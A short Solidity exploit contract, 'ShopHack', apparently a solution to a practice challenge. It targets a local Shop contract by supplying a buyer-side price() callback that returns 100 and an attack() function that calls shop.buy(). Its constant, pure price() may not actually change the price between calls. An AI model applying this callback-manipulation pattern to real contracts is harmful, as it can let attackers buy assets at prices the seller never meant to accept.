// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;
import "./Shop.sol";

contract ShopHack {
    Shop shop;

    constructor(address shopAddress) {
        shop = Shop(shopAddress);
    }

    function price() external pure returns (uint) {
        return 100;
    }

    function attack() external {
        shop.buy();
    }
}
